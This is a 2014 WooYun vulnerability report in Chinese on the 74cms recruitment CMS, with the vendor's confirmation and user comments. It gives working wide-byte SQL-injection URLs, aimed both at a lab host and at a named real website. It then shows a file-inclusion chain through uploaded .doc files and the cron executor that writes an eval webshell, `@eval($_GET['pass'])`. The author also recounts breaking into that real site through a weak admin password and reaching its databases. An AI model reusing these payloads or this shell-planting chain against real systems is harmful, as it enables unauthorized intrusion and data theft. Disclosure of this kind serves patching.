{"id": 1439, "wybug_id": "wooyun-2014-070140", "wybug_title": "利用骑士cms的一次纠结的渗透测试过程(两个潜在而被忽略的漏洞分析)", "wybug_corp": "74c,s.com", "wybug_author": "menmen519", "wybug_date": "2014-07-29 15:39", "wybug_open_date": "2014-09-12 15:40", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件操作参数未加过滤", "源码审核", "文件包含漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向公众公开  简要描述： 今天下载了骑士cms的最新版本，由于好久以前一个哥们发了一个后台拿shell的漏洞，还有别人发的一个sql注入的漏洞，一个有意思的渗透测试过程就从这两个地方开始了，成功的拿下了某大型人才网站的服务器，过程算比较艰辛吧，由于附带了对其实cms的漏洞重新分析，并且加入了自己新的利用方法，所以这里提交到了通用漏洞 详细说明：  第一步 我们分析一个老的sql注入问题：文件job/plus/ajax_common.php:(lines:88-100)\n{\tif (empty($_GET['query']))\t{\texit();\t}\t$gbk_query=trim($_GET['query']);\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$gbk_query=iconv(\"utf-8\",QISHI_DBCHARSET,$gbk_query);\t}\t\t$sql=\"SELECT * FROM \".table('hotword').\" WHERE w_word like '%{$gbk_query}%' ORDER BY `w_hot` DESC LIMIT 0 , 10\";\t$result = $db->query($sql);\niconv 这个函数在做编码转换的时候，会引入特殊字符，我们搭建了测试站点，如下：http://192.168.47.131/74cms_v3.4.20140709/upload/plus/ajax_common.php?act=hotword&query=aa让我们请求这个的时候，里面的问题参数query可能存在sql注入，首先我们直接使用单引号http://192.168.47.131/74cms_v3.4.20140709/upload/plus/ajax_common.php?act=hotword&query=aa'\n\n下来我们继续注入宽字节：http://192.168.47.131/74cms_v3.4.20140709/upload/plus/ajax_common.php?act=hotword&query=aa%8c%27\n\n由此可以排除了上面两种情况，下来我们继续测试http://192.168.47.131/74cms_v3.4.20140709/upload/plus/ajax_common.php?act=hotword&query=aa%錦%27%20union%20select%201,concat(version(),user()),3%23%27\n\n神奇的貌似没有打补丁..........这里居然引入进来了，不过骑士cms做了过滤，对sql的操作，例如select union之类的做了过滤但是这个不影响，我不用就可以了，仍然可以通过盲注去猜测表结构,这里直接附带一个站点的测试，当然它没有做更新：url:http://edc.dky.bjedu.cn/job/plus/ajax_common.php?act=hotword&query=aa%%E9%8C%A6%27%20union%20select%201,concat(version(),user()),3%23%27\n\n下来我们在分析另外一个漏洞，之前wooyun有过一个前台xss反射台拿shell的，这里原理一样，只不过我这里利用一个后台两个地方去获取shell，看一下代码：登陆后台，看到内容底下有个hr工具，如图：\n\n我们添加一个doc文件 ，文件的内容就是我们提前准备的shell，我们记录下这个文件的地址为：data/hrtools/2014/07/1406613408594.doc里面的内容就是一段小马................然后我们在到另外一个地方，如图：\n\n那么接下来我们分析分析代码，我们的doc文件里面的内容是：\n<?php\tfile_put_contents(\"../data/backup/shell.php\",\"<?php @eval(\\$_GET['pass']);?>\");?>\n我们看看这\n\n，这个地方有个执行按钮，那么接下来我们分析一下这里执行处的代码：admin/admin_crons.php:(lines:115-119)\nif (!empty($crons))\t{\t\tif (!file_exists(QISHI_ROOT_PATH.\"include/crons/\".$crons['filename']))\t\t{\t\tadminmsg(\"任务文件 {$crons['filename']} 不存在！\",0);\t\t}\trequire_once(QISHI_ROOT_PATH.\"include/crons/\".$crons['filename']);\tadminmsg(\"执行成功！\",2);\t}\t}\n这里明显就是从刚才那边直接取出来，然后包含执行了，那么我们点击执行，后根据我们doc文件我们会在backup底下生成一个shell.php\n\n这里面还有另外一个思路，按照目前的逻辑，我们貌似只能挂一个小马，但是如果挂上去的小马，不能利用或者连接不上怎么办，我们还有另外一种思路，就是直接上大马，那么这个就要利用三处地方，这里我们不在分析，直接看下面渗透测试思路就ok到这里代码就分析完了，这里全部都是在后台操作的，我们也可以在前台通过上传一个头像，利用xss进行getshell，功夫不负有心人，我们找到一个案例，而且貌似还比较大的网站：---------------------------------------------------------------下来我们进行渗透测试：站点：人才技能网(http://edc.dky.bjedu.cn/)经过测试后台存在弱口令，我们登陆到了后台\n\n我们进来之后，下来我们就是要去重复我上面分析的东西，结果真是巧合所挂的小马，菜刀链接不上，这里我就不演示了，我们直接看另外一个思路1.如果我们可以再hr工具编辑哪里，连续上传两个doc，一个doc就是我们的大马，另一个doc就是我们的写shell的文件doc，然后我们只要在写shell的doc里面从另外一个大马文件读出来，然后写到backup/shell.php 里面即可:操作如下：\n\n记录上面的两个url：url1（大马）：data/hrtools/2014/07/1406614082954.docurl2 （写shell）：data/hrtools/2014/07/1406614108668.doc写shell的doc，文件内容如下：\n<?php\t$file_path = \"../data/hrtools/2014/07/1406614082954.doc\";\t$content = file_get_contents($file_path);\tfile_put_contents(\"../data/backup/shell.php\",$content);?>\n然后我们把url2，贴到工具-》的任务计划哪里，如图所示:\n\n保存后我们点击执行：然后我们的大马就生成了，哈哈.................\n\nok到此这个服务器就已经拿下了，这个服务器里面相对东西还是很多的，它不止有骑士cms一个，还有其他几个，例如phpcms，我们通过这个点全部都能那道数据库文件   漏洞证明：  \n\n\n\n内网ip：\n\n   修复方案：  对于骑士cms来说，还是在这里转义一下，后台那还是通过xss 盲打，然后 能构造出来shell的，建议重视并修改对于这个站点，及时升级，并改掉管理员密码   版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-31 16:45 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-29 15:40 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  偶像啊 大哥 火钳留名    \n     2014-07-29 15:41 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  坐等思路    \n     2014-08-20 17:02 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  我TM刚花了10乌云币看了洞  就对我公开了    \n     2014-08-20 17:36 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @铁蛋火车侠 ................    \n     2014-08-21 11:38 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  受益了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}